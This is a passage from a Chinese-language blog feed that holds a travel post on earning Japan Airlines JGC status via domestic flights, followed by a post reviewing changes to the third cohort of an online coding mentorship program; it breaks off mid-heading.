FOP？</p><p>FOP 跟哩程有點類似，但有不同的計算方式。簡單來說，FOP 是用來決定你的會員資格，而哩程你之後可以拿來換機票什麼的，目的不一樣。當你搭飛機的時候，會同時累積哩程跟 FOP。</p><p>舉例來說，我買日航的特價機票（大概一萬多）從松山飛羽田，單趟可以累積的哩程是 665 miles，FOP 是 665 * 1.5 &#x3D; 998。如果算成一萬換 1000 FOP 的話，那 5 萬 FOP 不就要 50 萬台幣？這成本到底低在哪？</p><p>不，不是這樣的。取得成本低是結合了兩個特有的優勢：</p><p>第一，日本國內線獎勵。</p><p>如果搭乘日本國內線，FOP 的累積率是兩倍，而且每一趟都能夠額外獲得 400 FOP 的 bonus！</p><p>舉例來說，如果你從羽田（HND）飛到沖繩（OKA），能夠得到的哩程是 984 miles，但 FOP 卻有 984 * 2 + 400 &#x3D; 2368 miles！</p><p>這邊要結合第二個優勢：外國人專屬的便宜機票，<a href="https://www.tw.jal.co.jp/world/zhtw/japan_explorer_pass/tw/">JEP（Japan Explorer Pass）</a>。</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__FVZ0w4P1m4AfOve209XK1Q.png"></p><p>為了促進觀光，滿多國家都會針對觀光客提供一些優惠，ANA 跟 JAL 都有，而 JAL 的這個 JEP 真的讓國內線機票便宜許多（以前還有另一個叫做 <a href="https://www.tw.jal.co.jp/twl/cms/contents/local/jal_news_001867.html">Yokoso</a>，但現在沒了）。</p><p>從羽田單程搭到沖繩，就是 10800 日幣，這邊換算成臺幣就算是 3100 塊好了（日幣匯率愈來愈高 QQ）。想要只搭羽田到沖繩這條線累積到 50000 FOP，要搭 22 次。換算下來，純看機票的話，取得成本就是 22* 3100 &#x3D; 68200。</p><p>假設日本來回機票一萬五，然後吃住一天三千台幣，六天五夜的話就是 15000 + 3000*5 + 68200 &#x3D; 98200。總成本大概在十萬左右，就能夠拿到這張半永久的會員卡！</p><p>而且在搭日本國內線的話如果運氣好，可以加 1000 日幣升級成 J 艙（就是日本國內線商務艙，但只有座椅不一樣而已），FOP 會再多 10%，取得成本就可以再壓低一點。</p><p>前面講了這麼多，最後只是要跟大家講這個結論：</p><blockquote><p>用十萬塊台幣，就能換一張半永久的航空公司高卡（希望規則永遠不要變 ）</p></blockquote><p>話說以上這些相關知識都是 JGC 的前輩們寫文章分享的，我上面只提了個大概，如果有興趣的話可參考底下的資料：</p><ol><li><a href="http://d3consulting.org/what-is-jgc/">JGC 大解析：新手必讀的 JGC 修行攻略 — 如何累積 FOP</a></li><li><a href="http://wind.suzukihiro.tw/jgc/">日航JGC修行攻略懶人包 10個關於JGC的Q&amp;A讓你快速入門</a></li><li><a href="http://bitesize.tw/jaljgc-01/">[飛行] 日航 JGC 修行 取得日航高階會員卡</a></li><li><a href="https://syku01.blogspot.com/2016/04/jgc.html">JGC修行懶人包：日航環球會員資格攻略</a></li></ol><h3 id="JGC-修行"><a href="#JGC-修行" class="headerlink" title="JGC 修行"></a>JGC 修行</h3><p>因為我們要取得的目標是 JGC，所以這取得的過程就叫做 JGC 修行，而為了 JGC 特地去飛的人們就叫做 JGC 修行者。</p><p>為什麼是修行？</p><p>因為 JGC 修行者的經典行程長這個樣子：</p><p><strong>06:25（HND） -&gt; 09:10（OKA）<br>09:40（OKA） -&gt; 12:10（HND）<br>12:55（HND） -&gt; 15:20（OKA）<br>15:50（OKA） -&gt; 18:15（HND）</strong></p><p>對，你沒看錯，從東京飛到沖繩，再飛回來。又飛過去，再飛回來。一天跑四趟（又稱之為四腿），就能夠累積到將近一萬的 FOP。為了 JGC 專門去飛，而且一天飛四次，從早上六點飛到晚上六點，在飛機上的時間將近 12 個小時！</p><p>這樣你就懂為什麼這個要叫做修行了。</p><p>一年半前我從朋友那邊聽到 JGC 這個東西之後，覺得超級有興趣！雖然我也不是很常飛，對我來說花十萬塊去拿一張會員卡的效益也不大，但這很酷。</p><p>這很酷，而這就可以構成我想拿 JGC 的理由。</p><p>不過，我並不想按照經典行程那樣修行。因為真的太累，而且如果碰到飛機失接（趕不上下一班），後續的處理挺麻煩的，在不會講日文的情況下也很難順利地溝通。</p><p>而且之所以上面那個會是經典行程，是因為大家最缺的就是時間，希望愈快累積到 FOP 愈好，而上面那個行程一天累積一萬，只要五天就可以順利修行完畢，是最省時間的做法。</p><p>在 JGC 社團裡面我看過一句話：</p><blockquote><p>錢、時間跟屁股，你只能選兩個</p></blockquote><p>他們選擇了時間跟錢，而放棄了屁股，所以必須一天要坐 12 小時的飛機。如果選擇放棄錢，事情就簡單了，買個商務艙就好，又坐得舒服又不花時間。</p><p>而我選擇了比較少人選的那個：放棄時間。</p><h3 id="非典型-JGC-修行之旅"><a href="#非典型-JGC-修行之旅" class="headerlink" title="非典型 JGC 修行之旅"></a>非典型 JGC 修行之旅</h3><p>誠如我之前在<a href="/2019/04/13/4-years-review-7fb7edc52687/">《成為前端工程師的四週年回顧》</a>裡面所寫的，今年年底以前我都會維持在放假狀態，完全沒有打算工作甚至是找工作。因此說走就走，我有的是時間。</p><p>在臉書上有個 JGC 的社團，裡面都是修行者們彼此在交流資訊，也能夠一同修行，感受到同伴的存在。雖然我只是在裡面潛水而已，但也從裡面得到了很多有用的資訊，其中我得到最有用的是一張 FOP C&#x2F;P 值的清單。</p><p>上面依照一塊錢可以得到的 FOP 來排序，經典的羽沖線大概排在第十名左右，而我那時心裡就想：「不如就按照這個清單再加上個人喜好來排行程好了！」</p><p>因為不想要只待短短的，所以我預計一個地方停個兩三天左右。於是我就先從清單上找了幾個點，想說這些點一定要去。然後特別想去京都，所以要在大阪多留幾天，東京那邊要去找朋友，也要多留幾天。當初預想的計畫是五月初出發，五月底回來。</p><p>後來發現兩件事：</p><ol><li>五月初是黃金週，應該要避開</li><li>想去的點太多了，要拿掉一些</li></ol><p>於是先把開頭跟結尾先定好，5&#x2F;8 出發，5&#x2F;31 回來。中間的行程就開始隨意排，原則大概就是：</p><ol><li>大阪停久一點</li><li>東京停久一點</li><li>每個地方至少待一兩晚</li></ol><p>最後的行程長這樣：</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__4wPv8AqL0YYCjY34SxIXPQ.png"></p><p>規劃機票的地方是最有趣的，因為有時候如果機票賣完你就得想替代方案。例如說原本可能想去秋田，但是時間弄不攏，於是只好多去一天仙台之類的。</p><p>然後我個人希望盡可能不要太趕，所以你會發現很多班機都是隔天飛而不是同一天飛很多班，FOP 最多的羽石線我也只搭一次，因為我想在島上多待幾天，騎 GOGORO 環島。</p><p>我自己算是還滿滿意這個行程的，但現在跑完之後如果讓我回到過去，我會想要改幾個地方：</p><ol><li>石垣島可以少待一天</li><li>福岡可以少待一天</li><li>札幌可以少待一天</li><li>多出來這三天可以多去一至兩個點</li></ol><p>最後的花費其實佔最多的就是 CP 值最差的台北日本來回機票，日航的機票真的不便宜。但還是會選擇日航就是因為最省事。如果飛機出了什麼問題大 delay 導致第一天就失接，因為都是日航的關係所以應該會幫忙處理。</p><p>最後大概是台幣 45k，拿到 30000 的 FOP。</p><p>咦，那剩下的兩萬怎麼辦？我有買到國泰 bug 票，靠越南到紐約的來回商務艙，差不多就兩萬，剛好把剩下的補齊。</p><p>所以上面就是我這次去日本的行程。</p><p>標題所說的「非典型」是因為這行程跟經典行程差很大，「微」是因為我沒有修到 JGC，只有先修到一半拿到水晶卡，還要再兩萬 FOP 才能加入 JGC。</p><h3 id="飛行心得"><a href="#飛行心得" class="headerlink" title="飛行心得"></a>飛行心得</h3><p>因為行程本來就有特別排過，你看到那些兩趟之間只隔 30 分鐘的，通常都是原班機來回，所以基本上不用擔心失接的問題，而這一次行程中還真的每一趟都滿順利的。</p><p>第一天是最緊張的一天，抵達日本之後去 check-in，地勤跟我說她不確定我晚上那班（青森到札幌）能不能順利接上，問我要不要改票提早到青森，我就說好。可是她說這班因為濃霧的關係可能會原機遣返，想了想我也沒其他選擇，就答應了。</p><p>而幸運的是飛機成功抵達了，而抵達青森以後我還要過大概四個小時才會搭飛機到札幌，因此進了地點滿隱密的青森機場貴賓室。這邊提醒一下大家，去日本絕對要辦一張 JCB 卡，各個機場貴賓室免費隨意進（而且不用刷卡買機票）。</p><p>雖然大多數貴賓室都只提供飲料而已（少數在早上時會提供一些簡單的麵包），但有個地方可以休息還是很不錯的，而且一定有插座跟 wifi，是個補充電力的好地方。</p><p>除此之外印象比較深刻的是從福岡飛花卷的時候很順利，但原機從花卷再飛回福岡時卻出現了機件疑似故障的問題（因為空服員講什麼我聽不懂，所以只能猜測），delay 了大概一個多小時才飛。</p><p>隔了兩三天我從大阪要飛三澤的時候，在飛機上還碰到了同一位空姐，登機時她看了我兩秒，然後露出了日本人式的驚訝表情（欸～～～）還倒退兩步，真是巧。她跟我講了一些日文但我也聽不懂，猜測應該也是要說好巧吧。</p><p>還有一個是當你的班機間隔很短時，通常下飛機後會找地勤直接帶你去管制區內的登機門，你就不用出去以後再過一次安檢才能進來。但我這次因為飛機都沒有 delay，所以我都自己走出去後再過一次安檢。發現如果飛機沒有 delay，30 分鐘的時間其實還滿夠的。</p><p>日本國內線的時間很鬆，大概一小時前 check-in 就好（或你要三十分鐘前好像也可以），起飛時間前的 10 ~ 15分鐘才開始登機，所以時間真的很充裕。</p><p>而升 J 艙也只升了兩次，因為有滿多我飛的航線並沒有 J 艙，有 J 艙的那些又很熱門，所以常常被搶光。但坐一般座位其實也還好，因為通常旁邊都不會有人，空位其實滿多的，坐起來也挺舒服。然後飛機上有免費 wifi 可以用（有些機型沒有），而且通常飛一兩個小時就到了，不會覺得特別累。</p><p>總之呢，我覺得我的行程在飛行上來說是沒什麼難度的，沒有什麼需要特別注意的地方，一切都挺順利的。五月的話唯一的潛在風險大概就是濃霧，除了濃霧之外沒什麼好擔心的。</p><h3 id="旅遊心得"><a href="#旅遊心得" class="headerlink" title="旅遊心得"></a>旅遊心得</h3><p>跟飛行比起來，旅遊是累的。原因是去的點太多了，所以兩三天就要換一個地方，有幾天甚至每天都要到新的地方去。住的地方如果是一般飯店還好，但有些住的是膠囊旅館就比較痛苦了。</p><p>印象深刻的地方有兩個，一個是去福岡住的膠囊旅館，行李要寄放在一樓櫃檯，可是房間跟洗澡的地方都在二樓，所以你要上上下下跑很麻煩。第二個是大阪的膠囊旅館，規定早上 11 點到下午 3 點之類的不能在旅館裡，幸好我只在那邊住一天，不然我一定瘋掉。</p><p>在旅遊型態方面我本來就是個很 free 的人，或你要說我浪費我也接受。一大堆可能會被你說浪費的行為我都做過：</p><ol><li>在日本吃一堆常見的東西（像是麥當勞跟肯德基）</li><li>在旅館待半天用電腦耍廢不出門</li><li>懶得去知名景點</li></ol><p>但對我來說就是我爽就好，旅遊歸旅遊，還要幫自己立一大堆規則，真的很不適合我這種懶人。所以我通常都是想吃什麼就吃什麼，想去哪就去哪，對我來說，就算一整天都待在飯店也沒關係。</p><p>不過儘管如此，還是有看到一些我滿喜歡的東西，例如說北海道大學的櫻花：</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__qTN5MOaRpnIqwchQxUfCjg.jpeg"></p><p>或者是走路繞了福岡的大湖公園（ aka 大濠公園）一圈，發現陽光倒映在水面上真的漂亮，整個氛圍超級輕鬆。很想對那天的公園說：I can do this all day。</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__eVvxfo7cRHQ__0K65kCYTbA.jpeg"></p><p>也有到大阪知名的地標拍個照，發現人潮比我想像中的還要多。比起大阪，這趟旅程我比較喜歡一些小城市，像是盛岡與弘前，一樣有一些在地景點可以看，但是人少超級多。</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__rE6gSDDgvURx6nscS9u3xQ.jpeg"></p><p>也順利地按照計畫去石垣島上面騎了 GOGORO，我租兩個整天，一共是 6000 日幣。用了半天來環島，在石垣島騎車滿舒服的，天氣熱但是騎車很涼快，晚上的話則是本來就很涼快。覺得跟台灣的有些離島其實有幾分類似。</p><p><img src="/img/jgc-and-jal-ctystal-862f2bb4af8b/1__TbMJwFpKCfff4glg6psp4A.jpeg"></p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這一趟旅程去了很多地方，對我來說最大的收穫大概是在旅遊的途中不斷思考自己想要的旅遊型態究竟是什麼（我還想說旅遊一陣子之後要來寫一篇：旅行的意義），以這一趟日本之旅來看，大概就是想要一個隨心所欲的旅程，以及不要太多人的地方。</p><p>在東京的時候去參觀了許多朋友的辦公室，像是 Yahoo、Google、Mercari、Indeed 與 LINE，感謝各位大大在那邊工作，我才能有機會去參觀。也感謝在京都與東京的其他朋友們。</p><p>會寫這篇一來是因為這陣子有人問我去日本做什麼，我很難在一時半刻之間回答，所以寫一篇來稍微解釋 JGC 這個東西；二來也是趁著記憶還新鮮時加入寬油、開大火烹調，把最新鮮的記憶用另外一種方式保存起來，幫自己留個紀錄。</p><p>昨天晚上在羽田機場 check-in 時，看到經濟艙的櫃檯排好多人。抵達松山機場之後等行李大概等了二三十分鐘，卻看到那些有掛優先牌子的行李們十五分鐘前就已經出現在軌道上了。</p><p>沒關係，下次就換我了（由奢入儉難，感覺用過這些福利就回不去了，真是條不歸路）。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從線上到線下：第三期教學實驗滿月心得分享</title>
      <link href="/2019/05/29/from-online-to-offline-bd99e545277a/"/>
      <url>/2019/05/29/from-online-to-offline-bd99e545277a/</url>
      
        <content type="html"><![CDATA[<p><a href="/2019/03/14/mentor-program-3rd-47a2e85e33b3/">程式導師實驗計畫第三期</a>從 4&#x2F;15 開課到現在過了一個半月，原本這篇應該是要在一兩個禮拜前就寫好 po 出去，但前幾天沒什麼靈感外加住的地方不適合用電腦，只好拖到現在了。</p><p>應該不是每個人都想去查什麼是程式導師實驗計畫，所以在這邊直接幫大家簡介一下。基本上你可以想成就是程式培訓班，但是是線上版。所以上課不是實體課程而是看錄好的影片，也沒有實體教室，一切的東西都在線上。或你也可以想成就是一系列的線上課程外加作業跟進度還有同學。</p><p>招生方式為繳交報名表然後篩選，每一期長度大概是六個月，人數不定。第一期約為 10 個，第二期 30 個，現在是第三期，人數約為 60 人。計畫目標為從零到一，讓學員們找到工作，所以學員大多數皆為<strong>毫無基礎</strong>的初學者，連迴圈都不知道是什麼、幾乎沒寫過程式的那種。</p><p>目前這個計畫我把它當興趣在經營，而身為一個工程師，看到有哪邊不太好就會想要優化，所以從第一期到現在其實有不少的改動，接著會看到一系列第三期做的調整，包括課綱、線上學習系統跟線下活動。如果你只是想看我個人的心得，不想看這些調整的話，可以直接拉到最下面。</p><h3 id="前五週課綱的變化"><a href="#前五週課綱的變化" class="headerlink" title="前五週課綱的變化"></a>前五週課綱的變化</h3><p>前五週對整個計畫來說至關重要。如果你把課程難度設計的太高，那可能學生在前五週就開始落後了，會影響到學習的自信跟動力，之後只會愈來愈跟不上。</p><p>我們先來看第一期的前五週教了什麼：</p><h4 id="第一期"><a href="#第一期" class="headerlink" title="第一期"></a>第一期</h4><ol><li>程式基礎（Git、Command line、JavaScript）</li><li>前端基礎（HTML、CSS）</li><li>停課一週</li><li>前端基礎（JavaScript）</li><li>後端基礎（PHP、MySQL）</li></ol><p>對於完全的初學者來說，他們只有一週的時間就要把 Git 跟 JavaScript 基本語法學會，在一個月內必須把基本前端技能跟 PHP 都搞定。</p><p>當時的我以為這樣的時程安排是合理的，實際跑過之後才發現一點都不合理，除了有程式底子的人以外，初心者<strong>完全跟不上</strong>。</p><p>於是第二期我調整成這樣：</p><h4 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h4><ol><li>程式基礎（Git、Command line、JavaScript）</li><li>程式基礎（JavaScript）</li><li>前端基礎（HTML、CSS）</li><li>前端基礎（JavaScript）</li><li>後端基礎（PHP、MySQL）</li></ol><p>在程式基礎的部分多加了一週，其餘都跟第一期一樣。我原本以為這樣已經夠了，但卻發現對初心者來說似乎還需要點時間。雖然說乍看之下有兩週在學程式基礎，但要注意的是 Git 跟 Command line 其實就需要整整一週了，所以實際上學 JavaScript 還是只有一週的時間。</p><p>再者，第四週的 JavaScript 課程有一個作業是這樣的：</p><p><img src="/img/from-online-to-offline-bd99e545277a/1__5w0KzkTqulVIw9x2DqyeMw.png"></p><p>但重點是，他們那時候根本不知道什麼是 API，甚至連 HTTP 都不太清楚是個什麼樣的東西。所以從第二期學生的回饋中得知這個作業讓他們挫敗感很大，根本不知道從何開始。</p><p>於是到了第三期，前五週的課綱變成這樣：</p><h4 id="第三期"><a href="#第三期" class="headerlink" title="第三期"></a>第三期</h4><ol><li>暖身週（Git、Command line）</li><li>程式基礎（JavaScript）</li><li>程式基礎（JavaScript）</li><li>網路基礎（HTTP、API、Request、Response…）</li><li>複習週（複習前四週的東西）</li></ol><p>把 Git 跟 Command line 獨立出來變一週，讓他們有完整的時間可以學習。JavaScript 的部分放兩週（對一些初學者來說還是不太夠就是了），再來多塞了一個網路基礎，先教一些跟網路有關的東西，之後串 API 的時候就不會覺得難度很高（但這邊我沒有處理得很好，文末會檢討）。</p><p>而第五週也多加了一個複習週，這是第二期學生的建議。因為主進度一直在走，基本上一交完作業可能緊接著就是下一週的課程，完全沒有任何時間去複習之前的東西，以前有的疑問也沒有時間去找解答。經過第三期的測試，學員們普遍也滿喜歡複習週的，至少有一週是完全沒有進度的，可以拿來趕進度或是把之前沒弄懂的東西搞懂，進度壓力舒緩許多。</p><p>原本第一期第二週的前端基礎，在第三期被放到第六週；第五週的 PHP 被放到第九週。所以第三期跟第一期比起來，速度大概放慢了一倍。</p><p>而事實證明，這樣其實才是比較適合<strong>完全初心者</strong>的時程。</p><p>我希望課綱的設計是能讓完全初心者也能跟得上，所以會一直往這個方向去調整。對於已經有基礎的人來說，為了不讓他們進度太超前，我在第三期的作業裡面新增了一些挑戰題，可以寫寫看比較有難度的挑戰題，而不是先去看後面的東西。</p><p>這一招從 CS50 學來的，作業都會有一般版跟 hacker edition，後者的難度高上不少，儘管是工程師去修課都需要花點時間在 hacker edition 上面。</p><p>除了課綱，第三期在線上學習系統的部分也做了很多調整。</p><h3 id="線上教學系統加強"><a href="#線上教學系統加強" class="headerlink" title="線上教學系統加強"></a>線上教學系統加強</h3><p>前兩期在教學系統上面滿類似的，原則就是一個：<strong>以現成服務為主</strong>。</p><p>線上課程放在用 Teachable 架的網站：<a href="https://www.lidemy.com/">Lidemy</a>，需要直播的話則是用 YouTube。</p><p>日常溝通則是以 Slack 為主，有什麼疑難雜症都在上面發問即可。</p><p>交作業的部分採用 GitHub Classroom，流程則是 GitHub flow，每一個作業都要發 Pull Request，然後我會做 code review 並把作業 merge 進去 master。（延伸閱讀：<a href="https://github.com/aszx87410/blog/issues/27">利用 Github Classroom 加 Travis CI 打造改作業系統</a>）</p><p>在每日進度報告（學生每天必須 po 說自己昨天做了什麼以及今天想做什麼，靈感來源是每天在公司的 stand-up meeting）方面，則是在相對應的 GitHub Issue 上面留言（延伸閱讀：<a href="https://github.com/aszx87410/blog/issues/32">AWS Lambda + GitHub API + Google Sheet &#x3D; 自動化簽到系統</a>）。</p><p><img src="/img/from-online-to-offline-bd99e545277a/0__uNPcFxDpezE1QEHy.png"></p><p>其實一切都算順利，拿現有服務兜一兜省時又省力，可以快速就做出堪用的東西。但以上工具其實也伴隨著幾個缺點，我們一個一個來看。</p><h4 id="第一個缺點：Slack-免費版的限制"><a href="#第一個缺點：Slack-免費版的限制" class="headerlink" title="第一個缺點：Slack 免費版的限制"></a>第一個缺點：Slack 免費版的限制</h4><p>Slack 免費版有訊息上限，一旦超過了就沒辦法看到早期的訊息。用付費版基本上是不考慮，因為價格太高了。日常的聊天可以被回收掉無所謂，但對於學生後期去公司面試的心得或者是很常見的提問，我希望能夠被永久地保存起來。</p><p>之前就有大致看過現成的解決方案，發現在論壇的部分沒有一個特別好的。最後選用了去年被 GitHub 買走的 <a href="https://spectrum.chat/">spectrum</a>，我喜歡稱它為：「討論區版的 Slack」，因為介面跟用法都跟 Slack 極度類似，差別大概只有你可以發文，所以可以有標題跟內文，而不是像 Slack 只能有訊息內容而已。</p><p><img src="/img/from-online-to-offline-bd99e545277a/1__j0AxZ8JyogtqEo8uuY0K__g.png"><br><img src="/img/from-online-to-offline-bd99e545277a/1____mp6fGsfJbN4Xm8PUXDBPQ.png"></p><p>而且有個很重要的點是：它是完全免費的！</p><p>所以這次課程還是以 Slack 為主，但是以 spectrum 為輔。如果是比較長的提問、面試心得或者是在 Slack 上面很難問的問題（你要上傳圖片、打 code 之類的），就很適合在 spectrum 問。</p><p>不過課程進行至今，還是以 Slack 上的發言居多，spectrum 跟 Slack 的界線還是滿模糊的，這邊在課程進行到後半段的時候應該會好轉（因為問題變複雜了，可能一個發文平台還是比一個聊天平台好發問）。</p><p>總之呢，還是很推薦 spectrum，又綁 GitHub 又開源又免費，沒理由不支持。（延伸閱讀：<a href="https://github.com/aszx87410/blog/issues/41">記一次幫開源專案 spectrum 修 bug 的經歷</a>）</p><h4 id="第二個缺點：很難觀摩作業"><a href="#第二個缺點：很難觀摩作業" class="headerlink" title="第二個缺點：很難觀摩作業"></a>第二個缺點：很難觀摩作業</h4><p>在原本的交作業流程中，學生在自己的 repo 發完 PR 以後我去審核然後 merge，就算作業完成了。但問題有幾個：</p><ol><li>同學不知道自己的作業排在第幾位，不知道什麼時候會被改到</li><li>如果我忘記改，我也沒地方可以看到我忘記改了</li><li>你很難參考其他同學的作業，除非你事先鎖定幾個同學的 repo 並且關注。</li></ol><p>在第二期我其實是建立一個 Google 表單，要大家寫完作業就填表送出，我就可以用 Google 試算表看說我有哪些作業還沒改，改完我會標記我改完了。但後期發現這樣極度沒有效率，而且很多時候我都是收到 email 就直接改了，不會特地跑去 Google 試算表標記改完了。</p><p>第三期為了解決這個問題，我要求學生要交作業的時候除了送 PR，還要到一個 repo 底下去開 Issue，才算是完成交作業的流程：</p><p><img src="/img/from-online-to-offline-bd99e545277a/1__MGZs0Oeg8umQL9HqeLdniA.png"></p><p>雖然一樣是多一道手續（開 Issue），但是好處非常非常多：</p><ol><li>學生可以很明顯看到我還有多少作業沒改以及自己的順序</li><li>我改完之後順手關 Issue，就代表這個作業改完了</li><li>透過 label，學生可以很輕易地觀看某一週的作業並且參考</li><li>值得參考的作業我會加上一個標籤，可以直接用這個標籤來搜尋，省了很多時間</li></ol><p>我覺得幫助最大的是：「幫助同學們互相觀摩作業」，在上一期我只有隨口講講，但在這一期強烈建議大家看看同學們的作業，第一是你可以儘早培養看其他人程式碼的能力，第二是你可以從其他人的作業學到許多，這些都是單憑上課很難學到的東西。</p><p>這個如果以後想再延伸下去，可以變成強制 code review。提交 issue 後系統隨機 tag 兩個同學，要兩個同學都看過你的 code 以後才可以 merge 之類的。</p><h4 id="第三個缺點：沒有發揮效力的進度報告"><a href="#第三個缺點：沒有發揮效力的進度報告" class="headerlink" title="第三個缺點：沒有發揮效力的進度報告"></a>第三個缺點：沒有發揮效力的進度報告</h4><p>第二期的進度報告基本上就是在 GitHub Issue 上面留言，然後會自動同步到 slack 的某個 channel。但這造成了兩個問題，第一是 slack 訊息量會變大，更早碰觸到訊息量上限；第二是你當天 po 完進度報告之後，隔天又是另一個 issue，你可能不會想去看昨天其他人做了什麼。</p><p>總而言之，第二期的進度報告是著重在「讓我方便看」。但我後來發現進度報告不只如此，應該從學員的角度去思考進度報告可以為他帶來怎樣的幫助，而不是從老師的角度去思考。</p><p>於是第三期最大的改動，就是多了一個自己寫的整合學習系統：</p><p><img src="/img/from-online-to-offline-bd99e545277a/1__FZxu5tTRPewLRJprvptkHA.png"></p><p>第三期的進度報告比起第二期，其實比較像是「學習心得」，希望你除了寫說做什麼以外，也能夠寫自己的心得感想，心得看起來也會更有生命力（？）一點。</p><p>這邊我從 XDite 以前的文章裡學到了 ORID 這一招，用起來感覺挺不錯的，就搬過來了。也能幫助到不知道怎麼寫心得的學生們有個框架，會更好起頭一點。</p><p>這系統的另一個重點是：可以很輕易地看到別人的進度報告。</p><p><img src="/img/from-online-to-offline-bd99e545277a/1__ogQIdE22R6rteQoOlBWH__w.png"></p><p>這一個小小的改動在第三期裡面對學生起了關鍵的作用。線上跟實體課程的差異之一是前者比較容易感到孤單，你雖然知道有同學，但也沒什麼互動，根本就是不存在的同學；後者每天都會見到面，可能還會聊聊天，班級會更有凝聚力，彼此也可以互相成為動力，讓你知道自己不是孤單一人。</p><p>而這個看到別人進度報告的機制，就讓線上學習也有了實體課程的好處：You are not alone。你可以很明確地知道有這麼多人跟你一起在努力著，知道自己並不孤單。也可以知道其他同學是怎麼學習的，可能還會因此學到個一兩招。</p><p>上面有一個「顯示所有進度報告」的 checkbox 可以特別說明一下，這是因為進度報告其實是個雙面刃。其中一面上面講了，聽起來都是好的；而另外一面就是對於進度落後的學生，可能會有更落後的感覺。看到別人都在第六週但自己卻還在第三週，別人討論的東西聽不懂但自己也跟不上，於是自信心受挫然後學習動力降低，就再也跟不上了。</p><p>所以系統預設你只能看到 +1~-3 這範圍的進度報告，如果我在第六週，只會看到第七週到第三週的人的心得，就不會覺得自己離其他人很遠。若是你真的很想看所有人的，把選項勾起來也可以看到，算是一個很彈性的設計。</p><p>而自建系統之後，還可以做出像這種數據控可能會很愛的頁面：</p><p><img src="/img/from-online-to-offline-bd99e545277a/1__G1y1Ka3__6IQU1B1kTbN8rw.png"></p><p>在第三期計畫開始之前，我有寫過連續三十天的<a href="https://github.com/aszx87410/daily-notes">心得筆記</a>，裡面有記錄到幾件我在第三期想嘗試的事情，而這個系統就是其中之一。</p><p>跟第二期比起來，改動最大的地方就在於這個自己建的學習系統（後端 Node.js + MySQL + Sequelize，前端 React + Redux + Ant Design），可以把自己想做的功能都做進去。</p><p>目前課程進行到第六週，大家都滿喜歡這個系統的，我自己也是。有種老師在看學生聯絡簿裡寫的每日札記的感覺。</p><h3 id="從線上到線下"><a href="#從線上到線下" class="headerlink" title="從線上到線下"></a>從線上到線下</h3><p>終於要講到標題的部分了，會放在標題是因為這也是對課程來說一個滿重大的改變。</p><p>其實在一開始我並沒有意識到線下的重要性，所以在第一期的時候是完全線上的課程，我沒有在實體世界中見過任何一個學生，他們也沒有見過彼此。</p><p>但在第二期的時候有同學提出了實體聚會的想法，我自己也覺得其實實體聚會還是滿重要的，至少見面三分情（？），之後同學們彼此的交流應該也會比較順利。所以第二期的時候有辦了兩場實體聚會，不過主要的重點是找第一期的學長姐來分享自己學習的心得，整個聚會大概兩個小時，比較沒有學生間主動交流的時間。（延伸閱讀：<a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">四個月過去了，來找我學程式的學生們怎麼樣了？</a>）</p><p>而第三期的實體聚會除了前人的經驗分享以外，我還想要留一些時間讓大家自由交流，可以認識一下其他同學（如果你有這個意願的話）。但是絕對不玩團康，因為我不喜歡團康。我一直跟大家說自由交流時間你想交流就交流，不想交流也可以出去買個咖啡什麼的再回來，我鼓勵大家交流但絕對不強迫。</p><p>實體聚會的流程大概如下：</p><p>14:00–14:15 簡單開場<br>14:15–15:00 第二期學長姐經驗分享<br>15:00–16:00 自由交流時間<br>16:00–17:00 第二期學長姐經驗分享<br>17:00–18:00 自由交流時間</p><p>而第三期學生人數也變多了，所以必須真的去找那種平時有在辦活動的場地才容納得下：</p><p><img src="/img/from-online-to-offline-bd99e545277a/1__UYZYZZaqrGTbaNrRVoWZSA.jpeg"></p><p>實驗進行到第三期的好處就是第二期有不少人轉職成功，回來再參加聚會可以擔任分享者或者是讓第三期的同學們可以問問題，這種經驗之間的傳承還滿重要的，大概就像我寫文章的初衷那樣：幫助以前的自己。</p><p>而這次的實體聚會也讓我有了一個想法，如果這種聚會每個月或是每兩個月辦一次好像也不錯，但主題要再想一下。以我的個性來說，可能結業前我會想辦個黑客松，課程進行到一半時辦個程式競賽之類的，應該會滿有趣的。</p><p>不過比較麻煩的應該會是場地的部分，尤其是要辦黑客松的話會需要跨夜，不知道哪邊有適合的場地（如果你知道哪邊適合可以聯絡我）</p><p>除了實體聚會以外，我還做了一個我之前很想做的實驗計畫。</p><h4 id="小樹屋實驗計畫"><a href="#小樹屋實驗計畫" class="headerlink" title="小樹屋實驗計畫"></a>小樹屋實驗計畫</h4><p>小樹屋是一個租借場地的平台，上面有一大堆地點，而他們有個<a href="https://www.treerful.com/plans">月票方案</a>，每個月 5990 可以在 24 小時前任意租借空的場地，簡單來說就是有條件的吃到飽。</p><p>當初知道這個方案之後就覺得滿有趣的，於是有了一個想法：「不如我買了之後每天租場地，同學想開讀書會或是想來問問題甚至自習都可以」，因為不知道大家買不買單，所以我把這稱之為小樹屋實驗計畫。</p><p>嘗試了一個半月左右，每天平均會有兩三個人，其實不多，而我自己也不是每天都會去（而且大部分時間我都在國外）。</p><p>不過我覺得小樹屋的實體空間還是個滿必要的存在。至少學生碰到問題或是想找人討論的時候，有個空間可以讓他們去那邊。</p><p>其實我一直都滿想要一個實體空間的，因為我覺得很多實體很輕易做到的事情，線上是很麻煩的。比如說有時候講解一些程式概念，實體比手畫腳加上白版畫一畫，會比線上容易理解（儘管你用視訊也是）。實體空間還是有一些無法被取代的價值。</p><p>第三期的計畫在線下的部分主要就是多出了這個小樹屋的空間，讓同學們可以過來閒聊、求救、學習或耍廢之類的。</p><h3 id="可以改善的地方"><a href="#可以改善的地方" class="headerlink" title="可以改善的地方"></a>可以改善的地方</h3><p>前面看似把第三期講得多好多好，又是優化這個又是那個，但別忘記了，優化迷人的地方（或是討厭的地方）就在於它是永無止盡的。</p><p>雖然說跟第一期比起來已經改善許多，但仍然還有一些問題沒有被解決，我在這邊紀錄一下，也是提醒一下之後的自己。</p><h4 